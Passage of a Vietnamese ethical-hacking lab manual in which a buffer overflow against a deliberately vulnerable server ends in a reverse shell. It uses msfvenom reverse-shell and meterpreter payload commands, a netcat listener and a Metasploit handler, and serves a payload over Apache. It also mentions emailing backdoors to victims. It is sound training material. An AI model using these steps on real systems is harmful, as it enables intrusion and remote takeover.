41. Bây giờ, hãy nhấp vào Windows 11 chuyển sang máy mục tiêu (ở đây là Windows 11) và trong cửa sổ Trình gỡ lỗi miễn dịch , bạn có thể quan sát thấy trạng thái quy trình được thay đổi thành Tạm dừng, điều này cho biết rằng chức năng TRUN của máy chủ dễ bị tấn công đang có lỗ hổng tràn bộ đệm.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

42. Việc tăng hàm TRUN đã ghi đè các thanh ghi ngăn xếp như EAX, ESP, EBP và EIP. Việc ghi đè thanh ghi EIP có thể cho phép chúng ta có được quyền truy cập shell vào hệ thống đích.

43. Bạn có thể quan sát trong cửa sổ phía trên bên phải rằng các thanh ghi EAX, ESP, EBP và EIP bị ghi đè bằng giá trị ASCII \"A\", như trong ảnh chụp màn hình.

> ![Screenshot](media/image53.jpeg){width="10.666666666666666in" height="8.0in"}

44. Nhấp vào Bảo mật Parrot chuyển sang máy Bảo mật Parrot và nhấn Ctrl+Z để chấm dứt tập lệnh đang chạy trong cửa sổ terminal.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

45. Sau khi xác định được lỗ hổng tràn bộ đệm trên máy chủ mục tiêu, chúng ta cần thực hiện fuzzing. Làm mờ được thực hiện để gửi một lượng lớn dữ liệu đến máy chủ mục tiêu để nó gặp phải tình trạng tràn bộ đệm và ghi đè lên thanh ghi EIP.

46. Nhấp vào Windows 11 chuyển trở lại máy Windows 11 và đóng Trình gỡ lỗi miễn dịch và quy trình máy chủ dễ bị tấn công.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

47. Khởi chạy lại cả Trình gỡ lỗi miễn dịch và máy chủ dễ bị tấn công với tư cách quản trị viên. Bây giờ, Đính kèm quy trình máy chủ lỗ hổng vào Trình gỡ lỗi miễn dịch và nhấp vào biểu tượng Chạy chương trình trên thanh công cụ để chạy Trình gỡ lỗi miễn dịch.

48. Nhấp vào Bảo mật Vẹt để chuyển về máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

49. Thu nhỏ cửa sổ terminal / dòng lệnh. Nhấp vào menu Địa điểm hiện ở đầu Màn hình và chọn Mạng từ các tùy chọn thả xuống.

50. Cửa sổ Mạng xuất hiện; nhấn Ctrl+L. Trường Vị trí xuất hiện; nhập smb://10.10.1.11 và nhấn Enter để truy cập vào các thư mục dùng chung của Windows 11.

> ![Screenshot](media/image54.jpeg){width="10.666666666666666in" height="8.0in"}

51. Cửa sổ bật lên bảo mật xuất hiện; nhập thông tin xác thực của máy Windows 11 (Tên người dùng: Quản trị viên và Mật khẩu: Pa\$\$w0rd) và nhấp vào Kết nối.

52. Cửa sổ chia sẻ Windows trên 10.10.1.11 xuất hiện; nhấp đúp vào thư mục CEH-Tools.

> ![Screenshot](media/image55.jpeg){width="10.666666666666666in" height="8.0in"}

53. Điều hướng đến CEHv13 Mô-đun 06 System Hacking\\Buffer Overflow Tools và sao chép thư mục Tập lệnh. Đóng cửa sổ lại.

> ![new2.jpg](media/image56.jpeg){width="10.666666666666666in" height="8.0in"}

54. Dán thư mục Tập lệnh trên Màn hình nền.

55. Bây giờ, chúng ta sẽ chạy tập lệnh Python để thực hiện làm mờ. Để làm như vậy, hãy chuyển sang cửa sổ terminal / dòng lệnh, chạy cd /home/Attacker/Desktop/Scripts/, lệnh để điều hướng đến thư mục Tập lệnh trên Màn hình.

56. Thực thi chmod +x fuzz.py để thay đổi chế độ thực thi tập lệnh Python.

57. Chạy ./fuzz.py tập lệnh làm mờ Python trên máy mục tiêu.

> Khi bạn thực thi tập lệnh Python, buff sẽ nhân lên sau mỗi lần lặp của vòng lặp while và gửi dữ liệu buff đến máy chủ dễ bị tấn công.
>
> ![Screenshot](media/image57.jpeg){width="10.666666666666666in" height="8.0in"}

58. Nhấp vào Windows 11 chuyển sang máy Windows 11 và phóng to cửa sổ Dấu nhắc lệnh chạy máy chủ dễ bị tấn công.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

59. Bạn có thể quan sát các yêu cầu kết nối đến từ máy chủ (10.10.1.13).

> ![60.jpg](media/image58.jpeg){width="10.666666666666666in" height="8.0in"}

60. Bây giờ, hãy chuyển sang cửa sổ Trình gỡ lỗi miễn dịch và đợi trạng thái thay đổi từ Đang chạy sang Tạm dừng.

61. Trong cửa sổ phía trên bên phải, bạn cũng có thể quan sát rằng thanh ghi EIP không bị ghi đè bởi tập lệnh Python.

> ![Screenshot](media/image59.jpeg){width="10.666666666666666in" height="8.0in"}

62. Nhấp vào Bảo mật Vẹt chuyển sang máy Bảo mật Vẹt. Trong cửa sổ terminal / dòng lệnh, hãy nhấn Ctrl+C để kết thúc tập lệnh Python.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

63. Một thông báo xuất hiện cho biết rằng máy chủ dễ bị tấn công đã gặp sự cố sau khi nhận được khoảng 10200 byte dữ liệu nhưng không ghi đè lên sổ đăng ký EIP.

> Kích thước byte có thể khác nhau trong môi trường bài lab của bạn.
>
> ![Screenshot](media/image60.jpeg){width="10.666666666666666in" height="8.0in"}

64. Nhấp vào Windows 11 chuyển trở lại máy Windows 11 và đóng Trình gỡ lỗi miễn dịch và quy trình máy chủ dễ bị tấn công.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

65. Khởi chạy lại cả Trình gỡ lỗi miễn dịch và máy chủ dễ bị tấn công với tư cách quản trị viên. Bây giờ, Đính kèm quy trình máy chủ lỗ hổng vào Trình gỡ lỗi miễn dịch và nhấp vào biểu tượng Chạy chương trình trên thanh công cụ để chạy Trình gỡ lỗi miễn dịch.

66. Thông qua việc làm mờ, chúng tôi hiểu rằng chúng tôi có thể ghi đè lên thanh ghi EIP bằng 1 đến 5100 byte dữ liệu. Bây giờ, chúng ta sẽ sử dụng công cụ pattern_create Ruby để tạo byte dữ liệu ngẫu nhiên.

67. Nhấp vào Bảo mật Vẹt để chuyển về máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

68. Trong cửa sổ terminal / dòng lệnh mới, hãy thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).

> Mật khẩu bạn gõ sẽ không hiển thị.

69. Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

70. Chạy lệnh /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400.

> **-l: chiều dài, 10400: kích thước byte (ở đây, chúng tôi lấy giá trị số chẵn gần nhất của kích thước byte thu được ở bước trước)**

71. Nó sẽ tạo ra một đoạn byte ngẫu nhiên; nhấp chuột phải vào mã đó rồi nhấp vào Sao chép để sao chép mã và đóng cửa sổ terminal / dòng lệnh.

> ![Screenshot](media/image61.jpeg){width="10.666666666666666in" height="8.0in"}

72. Bây giờ, hãy quay lại cửa sổ terminal đã mở trước đó, chạy lệnh Pluma findoff.py.

73. Một tệp tập lệnh Python xuất hiện; thay thế mã trong dấu phẩy đảo ngược (\"\") trong biến bù trừ bằng mã đã sao chép.

74. Nhấn Ctrl+S để lưu tệp tập lệnh và đóng tệp đó.

> ![Screenshot](media/image62.jpeg){width="10.666666666666666in" height="8.0in"}

75. Trong cửa sổ terminal / dòng lệnh, hãy chạy lệnh chmod +x findoff.py để thay đổi chế độ thực thi tập lệnh Python.

76. Bây giờ, hãy thực thi lệnh ./findoff.py để chạy tập lệnh Python nhằm gửi các byte ngẫu nhiên được tạo đến máy chủ dễ bị tấn công.

> Khi đoạn script trên được thực thi, nó sẽ gửi các byte dữ liệu ngẫu nhiên đến máy chủ dễ bị tấn công mục tiêu, điều này gây ra lỗi tràn bộ đệm trong ngăn xếp.
>
> ![Screenshot](media/image63.jpeg){width="10.666666666666666in" height="8.0in"}

77. Nhấp vào Windows 11 chuyển sang máy Windows 11.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

78. Trong cửa sổ Trình gỡ lỗi miễn dịch, bạn có thể quan sát thấy thanh ghi EIP bị ghi đè bằng byte ngẫu nhiên.

79. Ghi lại các byte ngẫu nhiên trong EIP và tìm phần bù của các byte đó.

> ![Screenshot](media/image64.jpeg){width="10.666666666666666in" height="8.0in"}

80. Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

81. Trong cửa sổ terminal / dòng lệnh mới, hãy thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).

> Mật khẩu bạn gõ sẽ không hiển thị.

82. Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

83. Trong cửa sổ terminal / dòng lệnh, hãy chạy /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337.

> **-l: độ dài, 10400: kích thước byte (ở đây, chúng tôi lấy giá trị số chẵn gần nhất của kích thước byte thu được trong Bước#63), -q: giá trị bù trừ (ở đây, 386F4337 được xác định ở bước trước).**
>
> Độ dài byte có thể khác nhau trong môi trường bài lab của bạn.

84. Một kết quả xuất hiện cho biết rằng sổ đăng ký EIP đã xác định có độ lệch là 2003 byte, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image65.jpeg){width="10.666666666666666in" height="8.0in"}

85. Đóng cửa sổ terminal / dòng lệnh.

86. Nhấp vào Windows 11 để chuyển trở lại máy Windows 11 và đóng Trình gỡ lỗi miễn nhiễm và quy trình máy chủ dễ bị tấn công.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

87. Khởi chạy lại cả Trình gỡ lỗi miễn dịch và máy chủ dễ bị tấn công với tư cách quản trị viên. Bây giờ, Đính kèm quy trình máy chủ lỗ hổng vào Trình gỡ lỗi miễn dịch và nhấp vào biểu tượng Chạy chương trình trên thanh công cụ để chạy Trình gỡ lỗi miễn dịch.

88. Bây giờ, chúng ta sẽ chạy tập lệnh Python để ghi đè lên thanh ghi EIP.

89. Nhấp vào Bảo mật Vẹt để chuyển về máy Bảo mật Vẹt. Trong cửa sổ terminal / dòng lệnh, hãy chạy lệnh chmod +x overwrite.py để thay đổi chế độ thực thi tập lệnh Python.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

90. Bây giờ, hãy chạy lệnh ./overwrite.py để chạy tập lệnh Python nhằm gửi các byte ngẫu nhiên được tạo đến máy chủ dễ bị tấn công.

> Tập lệnh Python này được sử dụng để kiểm tra xem chúng ta có thể kiểm soát thanh ghi EIP hay không.
>
> ![Screenshot](media/image66.jpeg){width="10.666666666666666in" height="8.0in"}

91. Nhấp vào Windows 11 để chuyển sang máy Windows 11. Bạn có thể quan sát thấy thanh ghi EIP bị ghi đè, như trong ảnh chụp màn hình.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Kết quả chỉ ra rằng thanh ghi EIP có thể bị kiểm soát và ghi đè bằng shellcode độc ​​hại.
>
> ![Screenshot](media/image67.jpeg){width="10.666666666666666in" height="8.0in"}

92. Đóng Trình gỡ lỗi miễn dịch và quy trình máy chủ dễ bị tấn công.

93. Khởi chạy lại cả Trình gỡ lỗi miễn dịch và máy chủ dễ bị tấn công với tư cách quản trị viên. Bây giờ, Đính kèm quy trình máy chủ lỗ hổng vào Trình gỡ lỗi miễn dịch và nhấp vào biểu tượng Chạy chương trình trên thanh công cụ để chạy Trình gỡ lỗi miễn dịch.

94. Bây giờ, trước khi đưa shellcode vào thanh ghi EIP, trước tiên, chúng ta phải xác định các ký tự xấu có thể gây ra sự cố trong shellcode

> Bạn có thể lấy được badchars thông qua tìm kiếm trên Google. Các ký tự như không có byte, tức là \"\\x00\", là ký tự xấu.

95. Nhấp vào Bảo mật Vẹt để chuyển về máy Bảo mật Vẹt. Trong cửa sổ terminal / dòng lệnh, hãy chạy lệnh chmod +x badchars.py để thay đổi chế độ thực thi tập lệnh Python.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

96. Bây giờ, hãy chạy lệnh ./badchars.py để chạy tập lệnh Python nhằm gửi các ký tự xấu cùng với mã shell.

> ![Screenshot](media/image68.jpeg){width="10.666666666666666in" height="8.0in"}

97. Nhấp vào Windows 11 để chuyển sang máy Windows 11.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

98. Trong Trình gỡ lỗi miễn dịch, hãy nhấp vào giá trị đăng ký ESP ở cửa sổ trên cùng bên phải. Nhấp chuột phải vào giá trị thanh ghi ESP đã chọn và nhấp vào tùy chọn Theo dõi trong kết xuất.

> Giá trị ESP có thể khác khi bạn thực hiện bài thực hành này.
>
> ![Screenshot](media/image69.jpeg){width="10.666666666666666in" height="8.0in"}

99. Trong cửa sổ bên trái, bạn có thể quan sát thấy không có ký tự xấu nào gây ra sự cố trong shellcode, như minh họa trong ảnh chụp màn hình.

> Giá trị ESP có thể xảy ra khi bạn thực hiện tác vụ này.
>
> ![Screenshot](media/image70.jpeg){width="10.666666666666666in" height="8.0in"}

100. Đóng Trình gỡ lỗi miễn dịch và quy trình máy chủ dễ bị tấn công.

101. Khởi chạy lại cả Trình gỡ lỗi miễn dịch và máy chủ dễ bị tấn công với tư cách quản trị viên. Bây giờ, Đính kèm quy trình máy chủ lỗ hổng vào Trình gỡ lỗi miễn dịch và nhấp vào biểu tượng Chạy chương trình trên thanh công cụ để chạy Trình gỡ lỗi miễn dịch.

102. Bây giờ, chúng ta cần xác định đúng mô-đun của máy chủ dễ bị tấn công đang thiếu khả năng bảo vệ bộ nhớ. Trong Trình gỡ lỗi miễn dịch, bạn có thể sử dụng các tập lệnh như mona.py để xác định các mô-đun thiếu tính năng bảo vệ bộ nhớ.

103. Bây giờ, hãy điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 06 System Hacking\\Buffer Overflow Tools\\Scripts, sao chép tập lệnh mona.py và dán vào vị trí C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\PyCommands.

> Nếu cửa sổ bật lên Quyền truy cập thư mục đích bị từ chối xuất hiện, hãy nhấp vào Tiếp tục.
>
> ![Screenshot](media/image71.jpeg){width="10.666666666666666in" height="8.0in"}

104. Đóng cửa sổ File Explorer.

105. Chuyển sang cửa sổ Trình gỡ lỗi miễn dịch. Trong trường văn bản hiện ở cuối cửa sổ, nhập mô-đun!mona và nhấn Enter.

> ![Screenshot](media/image72.jpeg){width="10.666666666666666in" height="8.0in"}

106. Cửa sổ bật lên Dữ liệu nhật ký xuất hiện, hiển thị cài đặt bảo vệ của nhiều mô-đun khác nhau.

107. Bạn có thể nhận thấy rằng không có biện pháp bảo vệ bộ nhớ cho mô-đun essfunc.dll, như minh họa trong ảnh chụp màn hình.

> ![mona1.jpg](media/image73.jpeg){width="10.666666666666666in" height="8.0in"}

108. Bây giờ, chúng ta sẽ khai thác mô-đun essfunc.dll để chèn shellcode và kiểm soát hoàn toàn thanh ghi EIP.

109. Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

110. Trong cửa sổ terminal / dòng lệnh mới, hãy thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).

> Mật khẩu bạn gõ sẽ không hiển thị.

111. Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

112. Trong cửa sổ terminal / dòng lệnh, hãy chạy lệnh python3 /home/Attacker/converter.py.

> Tập lệnh này sẽ yêu cầu mã lắp ráp làm đầu vào.

113. Dấu nhắc Nhập mã lắp ráp tại đây : xuất hiện; nhập JMP ESP và nhấn Enter.

114. Kết quả xuất hiện, hiển thị mã hex của JMP ESP (ở đây, ffe4).

> Ghi lại giá trị mã hex này.

115. Đóng cửa sổ đầu cuối.

> ![Screenshot](media/image74.jpeg){width="10.666666666666666in" height="8.0in"}

116. Nhấp vào Windows 11 để chuyển về máy Windows 11.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

117. Trong cửa sổ Trình gỡ lỗi miễn dịch, nhập !mona find -s \"\\xff\\xe4\" -m essfunc.dll và nhấn Enter vào trường văn bản hiện ở cuối cửa sổ.

118. Kết quả xuất hiện, hiển thị địa chỉ trả về của mô-đun dễ bị tấn công, như trong ảnh chụp màn hình.

> Ở đây, địa chỉ trả về của mô-đun dễ bị tấn công là 0x625011af.
>
> ![mona2.jpg](media/image75.jpeg){width="10.666666666666666in" height="8.0in"}

119. Đóng Trình gỡ lỗi miễn dịch và quy trình máy chủ dễ bị tấn công.

120. Khởi chạy lại cả Trình gỡ lỗi miễn dịch và máy chủ dễ bị tấn công với tư cách quản trị viên. Bây giờ, Đính kèm quy trình máy chủ lỗ hổng vào Trình gỡ lỗi miễn dịch.

121. Trong cửa sổ Trình gỡ lỗi miễn dịch, hãy nhấp vào biểu tượng Đi đến địa chỉ trong Trình gỡ lỗi.

> ![im3.jpg](media/image76.jpeg){width="10.666666666666666in" height="8.0in"}

122. Cửa sổ bật lên Nhập biểu thức để theo dõi xuất hiện; nhập địa chỉ trả hàng đã xác định vào hộp văn bản (ở đây, 625011af) và nhấp vào OK.

> ![Screenshot](media/image77.jpeg){width="10.666666666666666in" height="8.0in"}

123. Bạn sẽ được trỏ tới 625011af ESP; nhấn F2 để thiết lập điểm dừng tại địa chỉ đã chọn, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image78.jpeg){width="10.666666666666666in" height="8.0in"}

124. Bây giờ, hãy nhấp vào Chạy chương trình trên thanh công cụ để chạy Trình gỡ lỗi miễn dịch.

125. Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

126. Tối đa hóa cửa sổ terminal / dòng lệnh, chạy lệnh chmod +x jump.py để thay đổi chế độ thực thi tập lệnh Python.

127. Bây giờ, hãy chạy lệnh ./jump.py để thực thi tập lệnh Python.

> ![Screenshot](media/image79.jpeg){width="10.666666666666666in" height="8.0in"}

128. Nhấp vào Windows 11 để chuyển sang máy Windows 11.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

129. Trong cửa sổ Trình gỡ lỗi miễn dịch, bạn sẽ thấy rằng sổ đăng ký EIP đã bị ghi đè bằng địa chỉ trả về của mô-đun dễ bị tấn công, như minh họa trong ảnh chụp màn hình.

> Bạn có thể kiểm soát thanh ghi EIP nếu máy chủ mục tiêu có các mô-đun không có cài đặt bảo vệ bộ nhớ thích hợp.
>
> ![mona4.jpg](media/image80.jpeg){width="10.666666666666666in" height="8.0in"}

130. Đóng Trình gỡ lỗi miễn dịch và quy trình máy chủ dễ bị tấn công.

131. Khởi chạy lại máy chủ dễ bị tấn công với tư cách quản trị viên.

132. Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

133. Mở cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).

> Mật khẩu bạn gõ sẽ không hiển thị.

134. Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

135. Trong cửa sổ terminal chạy lệnh sau để tạo shellcode.

> **msfvenom -p windows/shell_reverse_tcp LHOST=\[Địa chỉ IP cục bộ\] LPORT=\[Cổng nghe\] EXITFUNC=thread -f c -a x86 -b \"\\x00\"**
>
> Tại đây, -p: tải trọng, địa chỉ IP cục bộ: 10.10.1.13, cổng nghe: 4444, -f: filetype, -a: kiến ​​trúc, -b: ký tự xấu.

136. Một shellcode được tạo ra.

137. Chọn mã, nhấp chuột phải vào mã và nhấp vào Sao chép để sao chép mã.

> ![Screenshot](media/image81.jpeg){width="10.666666666666666in" height="8.0in"}

138. Đóng cửa sổ terminal / dòng lệnh.

139. Phóng to cửa sổ terminal / dòng lệnh đã mở trước đó. Chạy lệnh Pluma shellcode.py.

> Đảm bảo rằng terminal / dòng lệnh điều hướng đến/root/Desktop/Scripts.

140. Tệp shellcode.py xuất hiện trong cửa sổ soạn thảo văn bản, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image82.jpeg){width="10.666666666666666in" height="8.0in"}

141. Bây giờ, hãy thay thế shellcode đã sao chép ở Bước#137 trong phần tràn (Dòng 4); và nhập b ở đầu mỗi dòng để chuyển đổi chuỗi thành byte như hiển thị trong ảnh chụp màn hình, sau đó nhấn Ctrl+S để lưu tệp và đóng tệp.

> ![Screenshot](media/image83.jpeg){width="10.666666666666666in" height="8.0in"}

142. Bây giờ, trước khi chạy lệnh trên, chúng ta sẽ chạy lệnh Netcat để nghe trên cổng 4444.

143. Mở cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).

> Mật khẩu bạn gõ sẽ không hiển thị.

144. Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

145. Thực thi lệnh nc -nvlp 4444. Netcat sẽ bắt đầu nghe trên cổng 4444, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image84.jpeg){width="10.666666666666666in" height="8.0in"}

146. Chuyển về cửa sổ terminal / dòng lệnh đầu tiên. Chạy lệnh chmod +x shellcode.py để thay đổi chế độ thực thi tập lệnh Python.

147. Chạy lệnh ./shellcode.py để thực thi tập lệnh Python.

> ![Screenshot](media/image85.jpeg){width="10.666666666666666in" height="8.0in"}

148. Bây giờ, hãy quay lại terminal / dòng lệnh chạy lệnh Netcat.

149. Bạn có thể quan sát thấy quyền truy cập shell vào máy chủ dễ bị tấn công mục tiêu đã được thiết lập.

150. Bây giờ, hãy nhập whoami và nhấn Enter để hiển thị tên người dùng của người dùng hiện tại.

> ![mona3.jpg](media/image86.jpeg){width="10.666666666666666in" height="8.0in"}

151. Điều này kết thúc việc trình diễn thực hiện một cuộc tấn công tràn bộ đệm để có quyền truy cập vào hệ thống từ xa.

152. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

153. Khởi động lại máy Bảo mật Parrot. Để làm điều đó, hãy nhấp vào nút Trình đơn ở dưới cùng bên trái của Màn hình, từ trình đơn và nhấp vào biểu tượng Tắt thiết bị. A Tắt hệ thống này ngay bây giờ? cửa sổ bật lên xuất hiện, hãy nhấp vào nút Khởi động lại.

154. Nhấp vào Windows 11 để chuyển sang máy Windows 11. Khởi động lại máy.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

**Câu 6.1.3.1**

Đối với tác vụ này, hãy sử dụng máy Parrot Security (10.10.1.13) làm hệ thống của kẻ tấn công và máy Windows 11 (10.10.1.11) làm hệ thống đích. Thực thi và khai thác một ứng dụng có lỗ hổng D:\\CEH-Tools\\CEHv13 Module 06 System Hacking\\Buffer Overflow Tools\\vulnserver\\vulnserver.exe, để giành quyền truy cập của quản trị viên vào máy mục tiêu. Tập lệnh Python nào được sử dụng để kiểm tra xem chúng ta có thể kiểm soát thanh ghi EIP không?

![](media/image12.wmf)

TrướcTiếp theo

Lab 2: Thực hiện nâng cao đặc quyền để đạt được đặc quyền cao hơn

**Kịch bản bài lab**

Với tư cách là một hacker có đạo đức chuyên nghiệp hoặc chuyên gia kiểm thử xâm nhập (pentester), bước thứ hai trong quá trình hack hệ thống là nâng cao đặc quyền bằng cách sử dụng mật khẩu tài khoản người dùng có được trong bước hack hệ thống đầu tiên. Trong quá trình leo thang đặc quyền, bạn sẽ cố gắng giành quyền truy cập hệ thống vào hệ thống đích, sau đó cố gắng đạt được các đặc quyền cấp cao hơn trong hệ thống đó. Trong bước này, bạn sẽ sử dụng các kỹ thuật leo thang đặc quyền khác nhau như mạo danh đường ống có tên, khai thác dịch vụ bị định cấu hình sai, xoay vòng và chuyển tiếp để đạt được các đặc quyền cao hơn cho hệ thống đích.

Leo thang đặc quyền là quá trình đạt được nhiều đặc quyền hơn mức ban đầu có được. Tại đây, bạn có thể tận dụng các lỗi thiết kế, lỗi lập trình, lỗi và lỗi cấu hình trong hệ điều hành và ứng dụng phần mềm để có quyền truy cập quản trị vào mạng và các ứng dụng liên quan của nó.

Backdoor là các tệp độc hại chứa trojan hoặc các ứng dụng lây nhiễm khác có thể ngăn chặn trạng thái hoạt động hiện tại của máy mục tiêu hoặc thậm chí giành quyền kiểm soát một phần hoặc toàn bộ máy đó. Tại đây, bạn cần xây dựng các cửa hậu như vậy để có quyền truy cập từ xa vào hệ thống đích. Bạn có thể gửi các cửa hậu này qua email, ứng dụng web chia sẻ tệp và ổ đĩa mạng dùng chung, cùng với các phương pháp khác và lôi kéo người dùng thực thi chúng. Sau khi người dùng chạy một ứng dụng như vậy, bạn có thể có quyền truy cập vào máy bị ảnh hưởng của họ và thực hiện các hoạt động như ghi nhật ký thao tác bàn phím và trích xuất dữ liệu nhạy cảm.

**Mục tiêu bài lab**

-   Nâng cao đặc quyền bằng cách bỏ qua UAC và khai thác Sticky Keys

**Tổng quan về nâng cao đặc quyền**

Đặc quyền là vai trò bảo mật được gán cho người dùng đối với các chương trình, tính năng, hệ điều hành, chức năng, tệp hoặc mã cụ thể. Họ giới hạn quyền truy cập theo loại người dùng. Cần phải leo thang đặc quyền khi bạn muốn truy cập các tài nguyên hệ thống mà bạn không được phép truy cập. Nó diễn ra dưới hai hình thức: leo thang đặc quyền theo chiều dọc và leo thang đặc quyền theo chiều ngang.

-   **Nâng cao đặc quyền theo chiều ngang: Người dùng trái phép cố gắng truy cập vào tài nguyên, chức năng và các đặc quyền khác thuộc về người dùng được ủy quyền có quyền truy cập tương tự**

-   **Nâng cao đặc quyền theo chiều dọc: Người dùng trái phép cố gắng giành quyền truy cập vào tài nguyên và chức năng của người dùng có đặc quyền cao hơn, chẳng hạn như quản trị viên ứng dụng hoặc trang web**

Nhiệm vụ 1: Nâng cao đặc quyền bằng cách vượt qua UAC và khai thác Sticky Key

Phím cố định là một tính năng trợ năng của Windows giúp các phím bổ trợ vẫn hoạt động, ngay cả sau khi chúng được thả ra. Phím dính giúp người dùng gặp khó khăn khi nhấn tổ hợp phím tắt. Chúng có thể được kích hoạt bằng cách nhấn phím Shift 5 lần. Khóa dính cũng có thể được sử dụng để có được quyền truy cập đặc quyền, không được xác thực vào máy.

Ở đây, chúng tôi đang khai thác tính năng Khóa dính để giành quyền truy cập và nâng cao đặc quyền trên máy mục tiêu.

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt và đăng nhập bằng kẻ tấn công/toor. Mở cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Mật khẩu bạn gõ sẽ không hiển thị.

2.  Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

3.  Chạy lệnh msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe \> /home/Attacker/Desktop/Windows.exe.

4.  Trong lab trước, chúng ta đã tạo một thư mục hoặc thư mục dùng chung (chia sẻ) tại vị trí (/var/www/html) với quyền truy cập được yêu cầu. Vì vậy, chúng ta sẽ sử dụng cùng thư mục hoặc thư mục dùng chung (share) để chia sẻ Windows.exe với máy nạn nhân.

> Để tạo một thư mục mới nhằm chia sẻ tệp Windows.exe với máy mục tiêu và cung cấp các quyền, hãy sử dụng các lệnh bên dưới:

-   Chạy lệnh mkdir /var/www/html/share để tạo thư mục dùng chung

-   Chạy chmod -R 755 /var/www/html/share lệnh

-   Chạy chown -R www-data:www-data /var/www/html/share command

5.  Sao chép tải trọng vào thư mục dùng chung bằng cách thực thi lệnh cp /home/Attacker/Desktop/Windows.exe /var/www/html/share/.

6.  Khởi động máy chủ Apache bằng cách thực thi lệnh khởi động dịch vụ apache2.

7.  Chạy lệnh msfconsole trong cửa sổ terminal để khởi chạy Metasploit Framework.

8.  Trong loại Metasploit sử dụng khai thác/đa/trình xử lý và nhấn Enter.

9.  Bây giờ, hãy nhập đặt cửa sổ tải trọng/meterpreter/reverse_tcp và nhấn Enter.

10. Nhập đặt lhost 10.10.1.13 và nhấn Enter để đặt lhost.

11. Nhập đặt lport 444 và nhấn Enter để đặt lport.

12. Bây giờ, hãy nhập chạy trong bảng điều khiển Metasploit và nhấn Enter.

13. Nhấp vào Windows 11 để chuyển sang máy Windows 11 , nhấp vào Ctrl+Alt+Delete để kích hoạt máy và đăng nhập bằng Admin/Pa\$\$w0rd.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

14. Mở bất kỳ trình duyệt web nào (ở đây, Mozilla Firefox). Trong thanh địa chỉ, đặt con trỏ chuột, nhập http://10.10.1.13/share và nhấn Enter. Ngay khi bạn nhấn enter, nó sẽ hiển thị nội dung thư mục dùng chung.

15. Nhấp vào Windows.exe để tải tệp xuống.

